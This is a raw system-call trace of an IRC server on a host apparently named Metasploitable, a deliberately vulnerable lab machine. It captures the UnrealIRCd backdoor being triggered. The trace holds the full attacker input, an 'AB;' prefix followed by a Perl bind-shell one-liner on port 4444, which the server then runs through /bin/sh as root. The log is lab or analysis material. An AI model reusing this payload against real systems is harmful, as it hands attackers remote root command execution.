4519  12:57:06.210146 select(1024, [2 3 4 6 8], [], NULL, {0, 420000}) = 1 (in [2], left {0, 220000})
4519  12:57:06.416519 clock_gettime(CLOCK_MONOTONIC, {21836, 233541839}) = 0
4519  12:57:06.416542 time(NULL)        = 1495645026
4519  12:57:06.416553 time(NULL)        = 1495645026
4519  12:57:06.416569 gettimeofday({1495645026, 416574}, NULL) = 0
4519  12:57:06.416582 select(1024, [2], [], NULL, {0, 0}) = 1 (in [2], left {0, 0})
4519  12:57:06.416622 clock_gettime(CLOCK_MONOTONIC, {21836, 233635478}) = 0
4519  12:57:06.416682 gettimeofday({1495645026, 416688}, NULL) = 0
4519  12:57:06.416695 select(1024, [2 3 4 6 8], [], NULL, {1, 0}) = 1 (in [2], left {1, 0})
4519  12:57:06.416735 clock_gettime(CLOCK_MONOTONIC, {21836, 233748126}) = 0
4519  12:57:06.416747 accept(2, 0, NULL) = 5
4519  12:57:06.416765 getpeername(5, {sa_family=AF_INET, sin_port=htons(46189), sin_addr=inet_addr("10.0.2.4")}, [16]) = 0
4519  12:57:06.416796 fcntl64(5, F_GETFL) = 0x2 (flags O_RDWR)
4519  12:57:06.416808 fcntl64(5, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  12:57:06.416821 setsockopt(5, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
4519  12:57:06.416834 setsockopt(5, SOL_SOCKET, SO_RCVBUF, [8192], 4) = 0
4519  12:57:06.416845 setsockopt(5, SOL_SOCKET, SO_SNDBUF, [8192], 4) = 0
4519  12:57:06.416856 getsockopt(5, SOL_IP, IP_OPTIONS, "", [0]) = 0
4519  12:57:06.416871 setsockopt(5, SOL_IP, IP_OPTIONS, NULL, 0) = 0
4519  12:57:06.416887 clock_gettime(CLOCK_MONOTONIC, {21836, 233942673}) = 0
4519  12:57:06.416957 socket(PF_INET, SOCK_DGRAM, IPPROTO_IP) = 7
4519  12:57:06.416972 fcntl64(7, F_GETFL) = 0x2 (flags O_RDWR)
4519  12:57:06.416982 fcntl64(7, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  12:57:06.416991 fcntl64(7, F_SETFD, FD_CLOEXEC) = 0
4519  12:57:06.417001 connect(7, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, 16) = 0
4519  12:57:06.417018 send(7, "\365*\1\0\0\1\0\0\0\0\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1", 39, MSG_NOSIGNAL) = 39
4519  12:57:06.417071 accept(2, 0, NULL) = -1 EAGAIN (Resource temporarily unavailable)
4519  12:57:06.417112 gettimeofday({1495645026, 417116}, NULL) = 0
4519  12:57:06.417124 select(1024, [2 3 4 6 7 8], [], NULL, {1, 0}) = 1 (in [7], left {1, 0})
4519  12:57:06.419924 clock_gettime(CLOCK_MONOTONIC, {21836, 236952631}) = 0
4519  12:57:06.419953 recvfrom(7, "\365*\201\203\0\1\0\0\0\1\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1\300\22\0\6\0\1\0\0\0H\0A\10prisoner\4iana\3org\0\nhostmaster\froot-servers\300AwsD\225\0\0\7\10\0\0\3\204\0\t:\200\0\t:\200", 513, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, [16]) = 116
4519  12:57:06.419994 close(7)          = 0
4519  12:57:06.420010 recvfrom(-1, 0xbfbaddf7, 513, 0, 0xbfbadff8, 0xbfbaddf0) = -1 EBADF (Bad file descriptor)
4519  12:57:06.420024 send(5, ":irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...\r\n:irc.Metasploitable.LAN NOTICE AUTH :*** Couldn\'t resolve your hostname; using your IP address instead\r\n", 174, 0) = 174
4519  12:57:06.420083 time(NULL)        = 1495645026
4519  12:57:06.420096 time(NULL)        = 1495645026
4519  12:57:06.420108 gettimeofday({1495645026, 420112}, NULL) = 0
4519  12:57:06.420120 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  12:57:06.420149 clock_gettime(CLOCK_MONOTONIC, {21836, 237161866}) = 0
4519  12:57:06.420159 gettimeofday({1495645026, 420163}, NULL) = 0
4519  12:57:06.420170 select(1024, [2 3 4 6 8], [], NULL, {1, 0}) = 1 (in [6], left {0, 90000})
4519  12:57:07.328049 clock_gettime(CLOCK_MONOTONIC, {21837, 145071429}) = 0
4519  12:57:07.328073 recv(6, "PRIVMSG  #testit1 Hiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii\n", 8192, 0) = 55
4519  12:57:07.328101 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:07.328123 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:07.328138 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:07.328152 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:07.328166 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:07.328189 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:07.328203 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:07.328217 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:07.328230 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:07.328244 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:07.328257 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:07.328271 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:07.328284 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:07.328298 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:07.328311 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:07.328325 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:07.328339 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:07.328352 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:07.328366 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:07.328381 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:07.328395 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:07.328409 getrusage(RUSAGE_SELF, {ru_utime={0, 50000}, ru_stime={1, 70000}, ...}) = 0
4519  12:57:07.328474 gettimeofday({1495645027, 328480}, NULL) = 0
4519  12:57:07.328489 select(1024, [2 3 4 5 6 8], [], NULL, {1, 0}) = 1 (in [5], left {1, 0})
4519  12:57:07.328548 clock_gettime(CLOCK_MONOTONIC, {21837, 145560836}) = 0
4519  12:57:07.328560 recv(5, "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n", 8192, 0) = 244
4519  12:57:07.328589 rt_sigaction(SIGINT, {SIG_IGN}, {0x8062280, [HUP INT], 0}, 8) = 0
4519  12:57:07.328609 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
4519  12:57:07.328621 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
4519  12:57:07.328637 clone(child_stack=0, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0xbfbae034) = 18999
18999 12:57:07.328703 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
18999 12:57:07.328718 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
18999 12:57:07.328729 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
18999 12:57:07.328743 execve("/bin/sh", ["sh", "-c", "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n"], [/* 14 vars */]) = 0
18999 12:57:07.328851 brk(0)            = 0x80f9000
18999 12:57:07.328873 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
18999 12:57:07.328890 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f7c000
18999 12:57:07.328907 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
18999 12:57:07.328936 open("/etc/ld.so.cache", O_RDONLY) = 1
18999 12:57:07.328975 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
18999 12:57:07.328995 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f74000
18999 12:57:07.329020 close(1)          = 0
18999 12:57:07.329031 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
18999 12:57:07.329047 open("/lib/libncurses.so.5", O_RDONLY) = 1
18999 12:57:07.329061 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\200\220\0\0004\0\0\0h\344\2\0\0\0\0\0004\0 \0\4\0(\0\32\0\31\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0T\305\2\0T\305\2\0\5\0\0\0\0\20\0\0\1\0\0\0T\305\2\0T\325\2\0T\325\2\0004\36\0\0 \"\0\0\6\0\0\0\0\20\0\0\2\0\0\0\34\335\2\0\34\355\2\0\34\355\2\0\330\0\0\0\330\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\t\2\0\0&\2\0\0z\1\0\0L\0\0\0\0\0\0\0\0\0\0\0\25\0\0\0\333\1\0\0\0\0\0\0\0\0\0\0\t\2\0\0\20\2\0\0E\1\0\0\0\0\0\0\0\0\0\0T\0\0\0\367\1\0\0\0\0\0\0\0\0\0\0\306\1\0\0L\1\0\0\203\0\0\0\236\1\0\0\0\0\0\0\0\0\0\0\320\0\0\0005\0\0\0\233\1\0\0\375\0\0\0\265\0\0\0\0\0\0\0\267\0\0\0\0\0\0\0\246\1\0\0\33\1\0\0\300\1\0\0\356\0\0\0\223\0\0\0@\1\0\0\365\1\0\0\23\2\0\0O\0\0\0\303\1\0\0\0\0\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\0\0\0\225\0\0\0|\0\0\0\0\0\0\0x\0\0\0\364\1\0\0\0\0\0\0\21\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0^\1\0\0\0\0\0\0\22\2\0\0\0\0\0\0\371\0\0\0\33\0\0\0f\0\0\0\37\1\0\0\222\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\354\0\0\0\261\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\36\2\0\0\0\0\0\0\5\0\0\0\364\0\0\0\0\0\0\0R\0\0\0", 512) = 512
18999 12:57:07.329161 fstat64(1, {st_mode=S_IFREG|0644, st_size=190584, ...}) = 0
18999 12:57:07.329179 mmap2(NULL, 194420, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f44000
18999 12:57:07.329192 mmap2(0xb7f71000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x2c) = 0xb7f71000
18999 12:57:07.329209 close(1)          = 0
18999 12:57:07.329221 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
18999 12:57:07.329235 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
18999 12:57:07.329250 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
18999 12:57:07.329342 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
18999 12:57:07.329359 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f40000
18999 12:57:07.329371 mmap2(0xb7f42000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7f42000
18999 12:57:07.329389 close(1)          = 0
18999 12:57:07.329400 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
18999 12:57:07.329422 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
18999 12:57:07.329437 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
18999 12:57:07.329572 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
18999 12:57:07.329589 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f3f000
18999 12:57:07.329603 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7df0000
18999 12:57:07.329614 mmap2(0xb7f39000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7f39000
18999 12:57:07.329629 mmap2(0xb7f3c000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f3c000
18999 12:57:07.329643 close(1)          = 0
18999 12:57:07.329666 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7def000
18999 12:57:07.329678 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7def6b0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
18999 12:57:07.329735 mprotect(0xb7f39000, 4096, PROT_READ) = 0
18999 12:57:07.329772 munmap(0xb7f74000, 29913) = 0
18999 12:57:07.329798 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
18999 12:57:07.329812 open("/dev/tty", O_RDWR|O_NONBLOCK|O_LARGEFILE) = -1 ENXIO (No such device or address)
18999 12:57:07.329833 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb87540) = -1 ENOTTY (Inappropriate ioctl for device)
18999 12:57:07.329863 brk(0)            = 0x80f9000
18999 12:57:07.329873 brk(0x80fa000)    = 0x80fa000
18999 12:57:07.329885 brk(0x80fb000)    = 0x80fb000
18999 12:57:07.329901 getuid32()        = 0
18999 12:57:07.329918 getgid32()        = 0
18999 12:57:07.329951 geteuid32()       = 0
18999 12:57:07.329960 getegid32()       = 0
18999 12:57:07.329974 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
18999 12:57:07.330002 time(NULL)        = 1495645027
18999 12:57:07.330015 brk(0x80fc000)    = 0x80fc000
18999 12:57:07.330030 brk(0x80fd000)    = 0x80fd000
18999 12:57:07.330049 open("/proc/meminfo", O_RDONLY) = 1
18999 12:57:07.330072 fstat64(1, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
18999 12:57:07.330091 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f7b000
18999 12:57:07.330102 read(1, "MemTotal:      1035240 kB\nMemFree:        190048 kB\nBuffers:        111984 kB\nCached:         561936 kB\nSwapCached:          0 kB\nActive:         284616 kB\nInactive:       518540 kB\nHighTotal:      131008 kB\nHighFree:          240 kB\nLowTotal:       904232 kB\nLowFree:        189808 kB\nSwapTotal:           0 kB\nSwapFree:            0 kB\nDirty:            5096 kB\nWriteback:           0 kB\nAnonPages:      129316 kB\nMapped:          52020 kB\nSlab:            30588 kB\nSReclaimable:    21148 kB\nSUnreclaim:       9440 kB\nPageTables:       1972 kB\nNFS_Unstable:        0 kB\nBounce:              0 kB\nCommitLimit:    517620 kB\nCommitted_AS:   635684 kB\nVmallocTotal:   118776 kB\nVmallocUsed:      3420 kB\nVmallocChunk:   114760 kB\nHugePages_Total:     0\nHugePages_Free:      0\nHugePages_Rsvd:      0\nHugePages_Surp:      0\nHugepagesize:     2048 kB\n", 1024) = 846
18999 12:57:07.330191 close(1)          = 0
18999 12:57:07.330203 munmap(0xb7f7b000, 4096) = 0
18999 12:57:07.330215 brk(0x80fe000)    = 0x80fe000
18999 12:57:07.330242 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
18999 12:57:07.330255 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
18999 12:57:07.330268 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
18999 12:57:07.330280 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
18999 12:57:07.330292 rt_sigaction(SIGQUIT, {SIG_DFL}, {SIG_IGN}, 8) = 0
18999 12:57:07.330304 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_DFL}, 8) = 0
18999 12:57:07.330317 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
18999 12:57:07.330329 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
18999 12:57:07.330342 uname({sys="Linux", node="metasploitable", ...}) = 0
18999 12:57:07.330395 stat64("/", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
18999 12:57:07.330459 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
18999 12:57:07.330495 brk(0x8100000)    = 0x8100000
18999 12:57:07.330507 getcwd("/etc/unreal", 4096) = 12
18999 12:57:07.330522 getpid()          = 18999
18999 12:57:07.330540 getppid()         = 4519
18999 12:57:07.330556 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
18999 12:57:07.330577 stat64("/sbin/sh", 0xbfb87518) = -1 ENOENT (No such file or directory)
18999 12:57:07.330624 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
18999 12:57:07.330675 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
18999 12:57:07.330747 socket(PF_FILE, SOCK_STREAM, 0) = 1
18999 12:57:07.330780 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
18999 12:57:07.330825 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
18999 12:57:07.330881 close(1)          = 0
18999 12:57:07.330949 socket(PF_FILE, SOCK_STREAM, 0) = 1
18999 12:57:07.330983 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
18999 12:57:07.331009 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
18999 12:57:07.331029 close(1)          = 0
18999 12:57:07.331045 open("/etc/nsswitch.conf", O_RDONLY) = 1
18999 12:57:07.331081 fstat64(1, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
18999 12:57:07.331100 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f7b000
18999 12:57:07.331112 read(1, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
18999 12:57:07.331176 read(1, "", 4096) = 0
18999 12:57:07.331185 close(1)          = 0
18999 12:57:07.331195 munmap(0xb7f7b000, 4096) = 0
18999 12:57:07.331212 open("/etc/ld.so.cache", O_RDONLY) = 1
18999 12:57:07.331224 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
18999 12:57:07.331241 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f74000
18999 12:57:07.331251 close(1)          = 0
18999 12:57:07.331262 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
18999 12:57:07.331277 open("/lib/tls/i686/cmov/libnss_compat.so.2", O_RDONLY) = 1
18999 12:57:07.331292 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@\16\0\0004\0\0\0\204r\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0001a\0\0001a\0\0001a\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274c\0\0\274c\0\0\5\0\0\0\0\20\0\0\1\0\0\0\340n\0\0\340~\0\0\340~\0\0\250\2\0\0h\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\364n\0\0\364~\0\0\364~\0\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\340n\0\0\340~\0\0\340~\0\0\24\1\0\0\24\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\32\0\0\0&\0\0\0\4\0\0\0\7\0\0\0Q\0\200\2@\t\21\r\0\4\33\200\21H\262\201&\0\0\0\'\0\0\0(\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0)\0\0\0*\0\0\0+\0\0\0\0\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0\0\0\0\0\0\0\0\0002\0\0\0\0\0\0\0003\0\0\0004\0\0\0\0\0\0\0005\0\0\0\207[\246\22\365\33=\274\365\365K\23\0012\310%;]^\2674\10\301\346\357\37>\346\312\271\330\2749\303M%", 512) = 512
18999 12:57:07.331382 fstat64(1, {st_mode=S_IFREG|0644, st_size=30436, ...}) = 0
18999 12:57:07.331400 mmap2(NULL, 33352, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7de6000
18999 12:57:07.331421 mmap2(0xb7ded000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x6) = 0xb7ded000
18999 12:57:07.331469 close(1)          = 0
18999 12:57:07.331495 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
18999 12:57:07.331509 open("/lib/tls/i686/cmov/libnsl.so.1", O_RDONLY) = 1
18999 12:57:07.331523 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\00001\0\0004\0\0\0\234B\1\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340,\1\0\340,\1\0\340,\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\3407\1\0\3407\1\0\5\0\0\0\0\20\0\0\1\0\0\0\300>\1\0\300N\1\0\300N\1\0\350\2\0\0()\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\300>\1\0\300N\1\0\300N\1\0004\1\0\0004\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\374\0\0\0q\0\0\0 \0\0\0\n\0\0\0\1\1$\232 \'Q\0@ \0\0\f\1\1\n\1\n\0\0\240:X\0@\1\16$\10\4\200\n`\260\23 @\24\21\20@\3442\324\4H\346\0\1`\3@\260\272\2019\30\235\340\0\0\332\200\0044\2\201J\20{\203+\200\22 d\21\1\0\2\200\306 d`A\n\4\4\4\v\4PD@\200\20\0\22 \4\340@\1\32 \4\2\20\10\0\0\204\260\200\0\340\23\0\212$\0\206\210\0\2`@q\0\0\0\0\0\0\0\0\0\0\0r\0\0\0\0\0\0\0t\0\0\0\0\0\0\0", 512) = 512
18999 12:57:07.331611 fstat64(1, {st_mode=S_IFREG|0644, st_size=83708, ...}) = 0
